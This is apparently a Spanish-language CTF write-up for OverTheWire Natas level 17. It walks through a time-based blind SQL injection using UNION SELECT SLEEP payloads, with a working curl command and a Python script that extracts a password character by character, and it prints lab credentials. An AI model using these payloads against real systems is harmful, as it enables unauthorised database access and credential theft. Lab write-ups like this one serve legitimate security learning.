# Natas Level17

## Descripción
> **Level Goal (natas17.natas.labs.overthewire.org):** Mismo formulario de "comprobar existencia de usuario" que el nivel 15, pero esta vez **incluso los mensajes de "existe"/"no existe" están comentados** en el código (`//echo "This user exists.<br>";`), así que la respuesta HTTP es idéntica tanto si la consulta encuentra filas como si no.

## Solución
Sin ninguna señal visible en el cuerpo de la respuesta, la única señal que queda es el **tiempo de respuesta**: inyección SQL ciega basada en tiempo (time-based blind SQLi) usando `SLEEP()`.

Primer obstáculo: como en el nivel 15/17 se inyecta dentro de `username="..."` con `AND`/`OR` normal, y la tabla `users` de este nivel probablemente tiene pocas filas (o ninguna que combine con el usuario probado), un `SLEEP()` puesto directamente en el `WHERE` con `AND`/`OR` **solo se ejecuta si hay al menos una fila que evaluar**; si la tabla no tiene ninguna fila con ese patrón, el motor nunca llega a evaluar `SLEEP()` y no hay demora, dando un falso "no funciona".

La solución es forzar la ejecución de `SLEEP()` de forma **independiente del contenido de la tabla**, con una subconsulta vía `UNION SELECT`, que siempre se ejecuta una vez sin importar cuántas filas tenga `users`:

```bash
# confirmar que la inyección UNION funciona (siempre duerme, sin depender de filas existentes)
time curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx \
  --data-urlencode 'username=nonexist" UNION SELECT SLEEP(3),2-- -' \
  http://natas17.natas.labs.overthewire.org/index.php -o /dev/null
# real  0m3.4s
```

Con eso confirmado, se automatiza la extracción carácter a carácter de la contraseña de `natas18` usando `SLEEP(2*(condición))` — la multiplicación por 0/1 hace que solo se duerma cuando la condición es verdadera, sin usar `IF()` (evita depender de su disponibilidad/sintaxis exacta):

```python
import requests, time

auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
url = "http://natas17.natas.labs.overthewire.org/index.php"

def is_true(pos, ch):
    payload = (f'nonexist" UNION SELECT '
               f'SLEEP(2*(BINARY SUBSTRING(password,{pos},1)="{ch}")),2 '
               f'FROM users WHERE username="natas18"-- -')
    t0 = time.time()
    requests.post(url, auth=auth, data={"username": payload}, timeout=15)
    return (time.time() - t0) > 1.5

password = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for pos in range(1, 33):
    for c in charset:
        if is_true(pos, c):
            password += c
            break

print(password)
# fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

## Notas adicionales
- De nuevo, igual que en el nivel 15/16, se usó `BINARY SUBSTRING(...)="c"` desde el principio en vez de una comparación simple, para no repetir el error de recuperar la contraseña en minúsculas por la collation insensible a mayúsculas de MySQL.
- El primer intento con `AND`/`OR` fallando silenciosamente (0 segundos de demora, siempre) fue la pista de que el problema no era la sintaxis de `SLEEP()` sino el hecho de que el predicado nunca se evaluaba contra ninguna fila real; confirmar con un `UNION SELECT SLEEP(N)` "a pelo" (sin condición) antes de automatizar ayudó a aislar la causa exacta antes de perder tiempo con el bucle completo.
- Este tipo de inyección es mucho más lento en la práctica que uno con salida directa o incluso que un oráculo booleano visible (nivel 15): cada carácter cuesta, en el peor caso, recorrer casi todo el conjunto de candidatos a ~0.4s cada uno más ~2s extra en el acierto — la extracción completa de 32 caracteres tardó varios minutos.

## Referencias
- Reto original: http://natas17.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Blind_SQL_Injection (OWASP, Blind SQL Injection — variante basada en tiempo)
- Apoyo: https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_sleep (documentación de `SLEEP()` en MySQL)
